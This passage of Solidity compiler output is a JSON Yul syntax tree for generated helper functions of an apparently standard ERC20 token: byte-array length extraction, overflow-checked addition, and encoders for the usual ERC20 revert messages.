																			"nodeType": "YulFunctionCall",
																			"src": "2677:15:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2677:15:5"
																	},
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2712:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2715:4:5",
																					"type": "",
																					"value": "0x24"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2705:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2705:15:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2705:15:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "outOfPlaceEncoding",
																		"nodeType": "YulIdentifier",
																		"src": "2575:18:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "length",
																				"nodeType": "YulIdentifier",
																				"src": "2598:6:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2606:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "lt",
																			"nodeType": "YulIdentifier",
																			"src": "2595:2:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2595:14:5"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nodeType": "YulIdentifier",
																	"src": "2572:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2572:38:5"
															},
															"nodeType": "YulIf",
															"src": "2569:161:5"
														}
													]
												},
												"name": "extract_byte_array_length",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "data",
														"nodeType": "YulTypedName",
														"src": "2391:4:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "2400:6:5",
														"type": ""
													}
												],
												"src": "2356:380:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2789:174:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2799:16:5",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2810:1:5"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2813:1:5"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2806:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2806:9:5"
															},
															"variableNames": [
																{
																	"name": "sum",
																	"nodeType": "YulIdentifier",
																	"src": "2799:3:5"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2846:111:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2867:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"arguments": [
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "2874:3:5",
																							"type": "",
																							"value": "224"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "2879:10:5",
																							"type": "",
																							"value": "0x4e487b71"
																						}
																					],
																					"functionName": {
																						"name": "shl",
																						"nodeType": "YulIdentifier",
																						"src": "2870:3:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "2870:20:5"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "2860:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2860:31:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2860:31:5"
																	},
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2911:1:5",
																					"type": "",
																					"value": "4"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2914:4:5",
																					"type": "",
																					"value": "0x11"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "2904:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2904:15:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2904:15:5"
																	},
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2939:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2942:4:5",
																					"type": "",
																					"value": "0x24"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2932:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2932:15:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2932:15:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2830:1:5"
																	},
																	{
																		"name": "sum",
																		"nodeType": "YulIdentifier",
																		"src": "2833:3:5"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "2827:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2827:10:5"
															},
															"nodeType": "YulIf",
															"src": "2824:133:5"
														}
													]
												},
												"name": "checked_add_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2772:1:5",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2775:1:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "sum",
														"nodeType": "YulTypedName",
														"src": "2781:3:5",
														"type": ""
													}
												],
												"src": "2741:222:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3142:227:5",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "3159:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3170:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3152:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3152:21:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3152:21:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "3193:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "3204:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "3189:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3189:18:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3209:2:5",
																		"type": "",
																		"value": "37"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3182:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3182:30:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3182:30:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "3232:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "3243:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "3228:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3228:18:5"
																	},
																	{
																		"hexValue": "45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "3248:34:5",
																		"type": "",
																		"value": "ERC20: decreased allowance below"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3221:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3221:62:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3221:62:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "3303:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "3314:2:5",
																				"type": "",
																				"value": "96"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "3299:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3299:18:5"
																	},
																	{
																		"hexValue": "207a65726f",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "3319:7:5",
																		"type": "",
																		"value": " zero"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3292:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3292:35:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3292:35:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "3336:27:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "3348:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3359:3:5",
																		"type": "",
																		"value": "128"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "3344:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3344:19:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "3336:4:5"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_f8b476f7d28209d77d4a4ac1fe36b9f8259aa1bb6bddfa6e89de7e51615cf8a8__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "3119:9:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "3133:4:5",
														"type": ""
													}
												],
												"src": "2968:401:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3548:226:5",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "3565:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3576:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3558:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3558:21:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3558:21:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "3599:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "3610:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "3595:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3595:18:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3615:2:5",
																		"type": "",
																		"value": "36"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3588:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3588:30:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3588:30:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "3638:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "3649:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "3634:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3634:18:5"
																	},
																	{
																		"hexValue": "45524332303a20617070726f76652066726f6d20746865207a65726f20616464",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "3654:34:5",
																		"type": "",
																		"value": "ERC20: approve from the zero add"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3627:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3627:62:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3627:62:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "3709:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "3720:2:5",
																				"type": "",
																				"value": "96"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "3705:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3705:18:5"
																	},
																	{
																		"hexValue": "72657373",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "3725:6:5",
																		"type": "",
																		"value": "ress"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3698:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3698:34:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3698:34:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "3741:27:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "3753:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3764:3:5",
																		"type": "",
																		"value": "128"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "3749:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3749:19:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "3741:4:5"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_c953f4879035ed60e766b34720f656aab5c697b141d924c283124ecedb91c208__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "3525:9:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "3539:4:5",
														"type": ""
													}
												],
												"src": "3374:400:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3953:224:5",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "3970:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3981:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3963:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3963:21:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3963:21:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "4004:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "4015:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "4000:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4000:18:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4020:2:5",
																		"type": "",
																		"value": "34"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3993:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3993:30:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3993:30:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "4043:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "4054:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "4039:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4039:18:5"
																	},
																	{
																		"hexValue": "45524332303a20617070726f766520746f20746865207a65726f206164647265",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "4059:34:5",
																		"type": "",
																		"value": "ERC20: approve to the zero addre"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4032:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4032:62:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4032:62:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "4114:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "4125:2:5",
																				"type": "",
																				"value": "96"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "4110:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4110:18:5"
																	},
																	{
																		"hexValue": "7373",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "4130:4:5",
																		"type": "",
																		"value": "ss"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4103:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4103:32:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4103:32:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "4144:27:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "4156:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4167:3:5",
																		"type": "",
																		"value": "128"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "4152:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4152:19:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "4144:4:5"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_24883cc5fe64ace9d0df1893501ecb93c77180f0ff69cca79affb3c316dc8029__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "3930:9:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "3944:4:5",
														"type": ""
													}
												],
												"src": "3779:398:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "4356:179:5",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "4373:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4384:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4366:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4366:21:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4366:21:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "4407:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "4418:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "4403:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4403:18:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4423:2:5",
																		"type": "",
																		"value": "29"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4396:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4396:30:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4396:30:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "4446:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "4457:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "4442:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4442:18:5"
																	},
																	{
																		"hexValue": "45524332303a20696e73756666696369656e7420616c6c6f77616e6365",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "4462:31:5",
																		"type": "",
																		"value": "ERC20: insufficient allowance"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4435:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4435:59:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4435:59:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "4503:26:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "4515:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4526:2:5",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "4511:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4511:18:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "4503:4:5"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_3b6607e091cba9325f958656d2b5e0622ab7dc0eac71a26ac788cb25bc19f4fe__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "4333:9:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "4347:4:5",
														"type": ""
													}
												],
												"src": "4182:353:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "4714:227:5",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "4731:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4742:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4724:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4724:21:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4724:21:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "4765:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "4776:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "4761:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4761:18:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4781:2:5",
																		"type": "",
																		"value": "37"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4754:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4754:30:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4754:30:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "4804:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "4815:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "4800:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4800:18:5"
																	},
																	{
																		"hexValue": "45524332303a207472616e736665722066726f6d20746865207a65726f206164",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "4820:34:5",
																		"type": "",
																		"value": "ERC20: transfer from the zero ad"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4793:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4793:62:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4793:62:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "4875:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "4886:2:5",
																				"type": "",
																				"value": "96"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "4871:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4871:18:5"
																	},
																	{
																		"hexValue": "6472657373",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "4891:7:5",
																		"type": "",
																		"value": "dress"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4864:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4864:35:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4864:35:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "4908:27:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "4920:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4931:3:5",
																		"type": "",
																		"value": "128"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "4916:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "4916:19:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "4908:4:5"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_baecc556b46f4ed0f2b4cb599d60785ac8563dd2dc0a5bf12edea1c39e5e1fea__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "4691:9:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "4705:4:5",
														"type": ""
													}
												],
												"src": "4540:401:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "5120:225:5",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "5137:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "5148:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "5130:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "5130:21:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "5130:21:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "5171:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "5182:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "5167:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5167:18:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "5187:2:5",
																		"type": "",
																		"value": "35"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "5160:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "5160:30:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "5160:30:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "5210:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "5221:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "5206:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5206:18:5"
																	},
																	{
																		"hexValue": "45524332303a207472616e7366657220746f20746865207a65726f2061646472",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "5226:34:5",
																		"type": "",
																		"value": "ERC20: transfer to the zero addr"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "5199:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "5199:62:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "5199:62:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "5281:9:5"
																			},
																			{
																				"kind": "number",
